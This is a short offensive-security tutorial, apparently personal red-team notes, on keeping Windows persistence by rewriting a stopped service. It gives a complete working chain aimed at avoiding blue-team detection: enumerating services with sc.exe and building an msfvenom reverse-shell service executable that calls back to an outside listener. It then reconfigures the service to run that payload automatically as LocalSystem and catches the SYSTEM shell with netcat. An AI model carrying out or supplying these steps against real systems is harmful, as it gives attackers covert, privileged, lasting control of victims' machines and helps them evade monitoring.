# Modifying existing service

While creating ne services for persistence works quite well, the blue team may monitor new service creation across the network, so i want to reuse an existing service instead of creating one to avoid detection

usually, any disabled service will be a good candidate, as it could be altered without the user noticing it

first i need to know list of all the service is running on the machine

so i run

```cmd
sc.exe query state=all
```

find a stopped service, and query the service configuration

```cmd
sc.exe qc <Service-name>
```

There are three things i care about when using a service for persistence:

    The executable (BINARY_PATH_NAME) should point to the payload.
    The service START_TYPE should be automatic so that the payload runs without user interaction.
    The SERVICE_START_NAME, which is the account under which the service will run, should preferably be set to LocalSystem to gain SYSTEM privileges.

then i create the payload using `msfvenom` and `exe-service` parameter

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.100.101 LPORT=1337 -f exe-service -o rev-svc.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe-service file: 48640 bytes
Saved as: rev-svc.exe
```

and configure the service i want to modify
i.e the service i want to modify is MyService

```cmd
sc.exe config MyService binPath= "C:\Windows\rev-svc.exe" start= auto obj= "LocalSystem"
```

check the configuration if all went as expected using `qc`

and start the nc listener, start the service and BOOM!! i got the persistence system using an existing service


